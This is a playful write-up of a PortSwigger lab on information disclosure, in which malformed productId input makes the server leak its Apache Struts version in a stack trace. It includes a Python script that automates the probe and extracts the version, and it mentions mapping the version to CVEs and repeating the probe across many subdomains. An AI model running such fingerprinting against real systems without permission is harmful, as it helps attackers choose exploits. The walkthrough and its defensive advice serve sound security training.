# 🧠 When Servers Overshare: Sniping Apache Struts with a Simple String Injection

**Author: Aditya Bhatt** <br/>
**Category: Web App Hacking | Recon | Info Disclosure | CVE Enumeration**

---

## 📜 Prelude to a Leak

Some bugs scream. Others whisper.

This one? It *accidentally drops its whole backend résumé* just because I threw a string into a parameter that expected a good ol’ integer. 💥

Today, I’ll walk you through **how I turned a bad typecast into a full-on reconnaissance goldmine**, discovered Apache Struts 2.3.31, and solved the PortSwigger lab with the swagger of a bounty hunter in a trench coat.

But wait… we’re not stopping at the PoC.
You’ll also get a **Python script to automate the whole shebang.** Let’s twist it up, automate the intel grab, and make devs cry (ethically, of course 🫡).

![Cover](https://github.com/user-attachments/assets/ced86192-c81b-4b11-95df-0eec8de711e9) <br/>

---

## 🕹️ TL;DR of the Attack

We take a `productId` endpoint, feed it malformed input (a string instead of an int), and the app coughs up a verbose error message containing its internal framework version.

We collect that info and submit it to solve the lab.
Simple, elegant, and deliciously leaky.

---

## ⚔️ Step-by-Step PoC (with 🗿 energy)

1. Go to Lab: [Burp Lab - Info Leak via Error Messages](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages). Open any product and capture the request.

![1](https://github.com/user-attachments/assets/63564d4b-edb7-4862-89de-f5356a5876ac) <br/>

2. Send `GET /product?productId=5` to Repeater.

![2](https://github.com/user-attachments/assets/5dbf3139-3a08-44fa-909c-f07312f370c7) <br/>

3. Observe the normal response. Yawn. 😴

![3](https://github.com/user-attachments/assets/bb5c7ef6-72b0-42bc-b9eb-ecfac8e571b0) <br/>

4. Now swap `5` with `"example"` → `productId="example"` and boom — 💥 full Java stack trace drops in your lap.

![4](https://github.com/user-attachments/assets/e353c281-1be2-48d2-bb79-595dfd29a3ee) <br/>

In the stack trace, we spot the vulnerable tech:
   **`Apache Struts 2 2.3.31`**
   
5. Submit this version in the lab.

![5](https://github.com/user-attachments/assets/9de6d6c2-7a87-4b52-ae15-fbd9d0b07532) <br/>

6. You just solved it. Now imagine doing this across 200 subdomains. That’s bug bounty artillery right there. 🚀

![6](https://github.com/user-attachments/assets/f555d51c-72da-4194-b8e0-59de7f407c7c) <br/>

---

## 🤖 Automation Script: Lab Destroyer 9000

Here’s your script to *automate the whole lab*. Just plug in the **lab URL**, and it’ll throw a string payload, catch the error, extract the version, and print it like a true recon master.

> **⚠️ NOTE**: Make sure you’re logged into your PortSwigger Academy session in the same browser session (or use the session cookie in this script).

```python
import requests
import re

# 🔧 CONFIG
LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net/product?productId="
PAYLOAD = '"injection"'

# 🧠 HEADERS (Optionally add your session cookie if needed)
headers = {
    "User-Agent": "Mozilla/5.0",
    # "Cookie": "session=YOUR_SESSION_HERE"
}

# 🚀 MAKE THE REQUEST
def extract_version():
    try:
        print(f"[+] Sending request to: {LAB_URL}{PAYLOAD}")
        response = requests.get(LAB_URL + PAYLOAD, headers=headers, timeout=10)

        if response.status_code == 200:
            # 🧙 Regex magic to find Apache Struts version
            match = re.search(r'Apache Struts 2(?:\.| )([0-9]+\.[0-9]+\.[0-9]+)', response.text)
            if match:
                version = "2." + match.group(1)
                print(f"[🎯] Apache Struts version disclosed: {version}")
                return version
            else:
                print("[-] No version info found. Maybe lab is patched or wrong URL.")
        else:
            print(f"[-] Unexpected response code: {response.status_code}")

    except Exception as e:
        print(f"[!] Exception occurred: {e}")

# 🔍 Run the extractor
if __name__ == "__main__":
    extract_version()
```

---

## 💭 Real World Implications

* That one version string? It’s a **fingerprint**.
* Apache Struts is notorious for **RCEs like CVE-2017-5638** — the Equifax breach? Yeah, it started with something like this.
* Once you know the version, you can map it against CVEs and craft custom exploits or pivot further.

---

## 🔐 Defensive Juju

* Never expose internal stack traces to the user.
* Catch your exceptions, log them server-side, and serve generic 500 pages to users.
* Use a WAF or RASP to detect parameter fuzzing.

---

## 🧠 Final Thoughts

Information disclosure is a **gateway bug**.
It rarely gives you root access upfront, but it **opens the door** to version detection, CVE chaining, and attack surface expansion. Every recon artist’s dream.

When in doubt, just toss in the wrong input and let the server do the talking.

---
